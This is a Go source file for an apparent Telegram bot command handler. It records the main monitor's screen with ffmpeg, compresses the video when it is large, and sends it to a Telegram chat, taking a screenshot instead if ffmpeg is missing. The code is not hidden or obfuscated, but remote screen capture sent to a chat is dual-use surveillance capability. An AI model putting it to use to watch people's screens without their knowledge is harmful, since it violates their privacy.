package commands

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/kbinani/screenshot"
)

type VideoHandler struct {
	api               *tgbotapi.BotAPI
	screenshotHandler *ScreenshotHandler
}

func NewVideoHandler(api *tgbotapi.BotAPI) *VideoHandler {
	return &VideoHandler{
		api:               api,
		screenshotHandler: NewScreenshotHandler(api),
	}
}

func (h *VideoHandler) HandleVideoCommand(chatID int64) {
	displays := screenshot.NumActiveDisplays()
	if displays == 0 {
		msg := tgbotapi.NewMessage(chatID, "No active displays found")
		h.api.Send(msg)
		return
	}

	if !h.isFFmpegAvailable() {
		msg := tgbotapi.NewMessage(chatID, "FFmpeg not found. Taking screenshot instead...")
		h.api.Send(msg)

		h.screenshotHandler.HandleMainMonitorCommand(chatID)
		return
	}

	msg := tgbotapi.NewMessage(chatID, "Starting video recording (5 seconds)...")
	h.api.Send(msg)

	videoPath, err := h.recordVideo(5)
	if err != nil {
		errorMsg := tgbotapi.NewMessage(chatID, fmt.Sprintf("Failed to record video: %v", err))
		h.api.Send(errorMsg)
		return
	}

	fileInfo, err := os.Stat(videoPath)
	if err != nil {
		errorMsg := tgbotapi.NewMessage(chatID, "Failed to get video file info")
		h.api.Send(errorMsg)
		os.Remove(videoPath)
		return
	}

	fileSizeMB := float64(fileInfo.Size()) / (1024 * 1024)

	if fileSizeMB > 50 {
		compressedPath, err := h.compressVideo(videoPath)
		if err != nil {
			errorMsg := tgbotapi.NewMessage(chatID, fmt.Sprintf("Video too large (%.1fMB) and compression failed: %v", fileSizeMB, err))
			h.api.Send(errorMsg)
			os.Remove(videoPath)
			return
		}

		compressedInfo, err := os.Stat(compressedPath)
		if err != nil {
			errorMsg := tgbotapi.NewMessage(chatID, "Failed to get compressed video info")
			h.api.Send(errorMsg)
			os.Remove(videoPath)
			os.Remove(compressedPath)
			return
		}

		compressedSizeMB := float64(compressedInfo.Size()) / (1024 * 1024)
		if compressedSizeMB > 50 {
			errorMsg := tgbotapi.NewMessage(chatID, fmt.Sprintf("Video still too large after compression (%.1fMB). Try recording for a shorter duration.", compressedSizeMB))
			h.api.Send(errorMsg)
			os.Remove(videoPath)
			os.Remove(compressedPath)
			return
		}

		os.Remove(videoPath)
		videoPath = compressedPath
		fileSizeMB = compressedSizeMB
	}

	video := tgbotapi.NewVideo(chatID, tgbotapi.FilePath(videoPath))
	video.Caption = fmt.Sprintf("Screen Recording (%.1fMB)", fileSizeMB)
	_, err = h.api.Send(video)
	if err != nil {
		errorMsg := tgbotapi.NewMessage(chatID, fmt.Sprintf("Failed to send video: %v", err))
		h.api.Send(errorMsg)
	} else {
		successMsg := tgbotapi.NewMessage(chatID, "Video sent successfully")
		h.api.Send(successMsg)
	}

	os.Remove(videoPath)
}

func (h *VideoHandler) isFFmpegAvailable() bool {
	_, err := exec.LookPath("ffmpeg")
	return err == nil
}

func (h *VideoHandler) recordVideo(duration int) (string, error) {
	videoDir := os.TempDir()
	if err := os.MkdirAll(videoDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create temp directory: %v", err)
	}

	timestamp := time.Now().Format("20060102_150405")
	filename := fmt.Sprintf("screen_recording_%s.mp4", timestamp)
	videoPath := filepath.Join(videoDir, filename)

	displays := screenshot.NumActiveDisplays()
	if displays == 0 {
		return "", fmt.Errorf("no active displays found")
	}

	mainMonitorIndex := h.screenshotHandler.findMainMonitor()
	bounds := screenshot.GetDisplayBounds(mainMonitorIndex)

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("ffmpeg",
			"-f", "gdigrab",
			"-framerate", "15",
			"-t", fmt.Sprintf("%d", duration),
			"-offset_x", fmt.Sprintf("%d", bounds.Min.X),
			"-offset_y", fmt.Sprintf("%d", bounds.Min.Y),
			"-video_size", fmt.Sprintf("%dx%d", bounds.Dx(), bounds.Dy()),
			"-i", "desktop",
			"-c:v", "libx264",
			"-preset", "fast",
			"-crf", "28",
			"-pix_fmt", "yuv420p",
			"-movflags", "+faststart",
			videoPath,
		)
	} else {
		cmd = exec.Command("ffmpeg",
			"-f", "x11grab",
			"-framerate", "15",
			"-t", fmt.Sprintf("%d", duration),
			"-s", fmt.Sprintf("%dx%d", bounds.Dx(), bounds.Dy()),
			"-i", ":0.0",
			"-c:v", "libx264",
			"-preset", "fast",
			"-crf", "28",
			"-pix_fmt", "yuv420p",
			videoPath,
		)
	}

	err := cmd.Run()
	if err != nil {
		return "", fmt.Errorf("ffmpeg execution failed: %v", err)
	}

	return videoPath, nil
}

func (h *VideoHandler) compressVideo(inputPath string) (string, error) {
	dir := filepath.Dir(inputPath)
	ext := filepath.Ext(inputPath)
	name := filepath.Base(inputPath[:len(inputPath)-len(ext)])
	compressedPath := filepath.Join(dir, name+"_compressed"+ext)

	cmd := exec.Command("ffmpeg",
		"-i", inputPath,
		"-c:v", "libx264",
		"-preset", "slow",
		"-crf", "32",
		"-maxrate", "2M",
		"-bufsize", "4M",
		"-vf", "scale=1280:720",
		"-c:a", "aac",
		"-b:a", "128k",
		"-movflags", "+faststart",
		"-y",
		compressedPath,
	)

	err := cmd.Run()
	if err != nil {
		return "", fmt.Errorf("video compression failed: %v", err)
	}

	return compressedPath, nil
}
